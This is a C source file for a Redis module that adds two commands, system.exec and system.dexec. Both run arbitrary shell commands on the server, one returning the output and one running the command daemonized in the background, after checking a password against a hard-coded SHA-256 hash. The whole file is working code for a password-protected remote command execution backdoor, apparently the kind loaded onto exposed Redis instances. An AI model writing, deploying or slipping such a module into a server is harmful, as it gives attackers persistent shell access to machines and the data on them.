#include "redismodule.h"
#include "cmd.h"
#include "sha256.h"

#include <stdlib.h>
#include <string.h>

#define TARGET_HASH "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3"

#if defined(__GNUC__)
#define MODULE_API __attribute__((visibility("default")))
#else
#define MODULE_API
#endif


static int authorize_and_build_command(RedisModuleCtx *ctx, RedisModuleString **argv, int argc, char **cmd_out) {
        if (argc != 3) {
                return RedisModule_WrongArity(ctx);
        }

        size_t passwd_len;
        const char *passwd = RedisModule_StringPtrLen(argv[1], &passwd_len);
        size_t cmd_len;
        const char *cmd_raw = RedisModule_StringPtrLen(argv[2], &cmd_len);

        char hash[65];
        compute_sha256(passwd, passwd_len, hash);

        if (memcmp(hash, TARGET_HASH, 64) != 0) {
                return RedisModule_ReplyWithError(ctx, "ERR invalid password");
        }

        *cmd_out = RedisModule_Alloc(cmd_len + 1);
        if (*cmd_out == NULL) {
                return RedisModule_ReplyWithError(ctx, "ERR out of memory");
        }      

        memcpy(*cmd_out, cmd_raw, cmd_len);
        (*cmd_out)[cmd_len] = '\0';

        return REDISMODULE_OK;
}

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        char *cmd;
        int rc;

        rc = authorize_and_build_command(ctx, argv, argc, &cmd);
        if (rc != REDISMODULE_OK) {
                return rc;
        }

        char *output = run_cmd(cmd);
        RedisModule_Free(cmd);

        if (output == NULL) {
                return RedisModule_ReplyWithError(ctx, "ERR command failed");
        }

        RedisModule_ReplyWithStringBuffer(ctx, output, strlen(output));
        free(output);

        return REDISMODULE_OK;
}

int DexecCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        char *cmd;
        int rc;

        rc = authorize_and_build_command(ctx, argv, argc, &cmd);
        if (rc != REDISMODULE_OK) {
                return rc;
        }

        if (daemonize_cmd(cmd) != 0) {
                RedisModule_Free(cmd);
                return RedisModule_ReplyWithError(ctx, "ERR command failed");
        }

        RedisModule_Free(cmd);
        return RedisModule_ReplyWithSimpleString(ctx, "OK");
}

MODULE_API int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (RedisModule_Init(ctx,"system",1,REDISMODULE_APIVER_1) == REDISMODULE_ERR) return REDISMODULE_ERR;
        if (RedisModule_CreateCommand(ctx, "system.exec", DoCommand, "write", 1, 1, 1) == REDISMODULE_ERR) return REDISMODULE_ERR;
        if (RedisModule_CreateCommand(ctx, "system.dexec", DexecCommand, "write", 1, 1, 1) == REDISMODULE_ERR) return REDISMODULE_ERR;
        return REDISMODULE_OK;
}
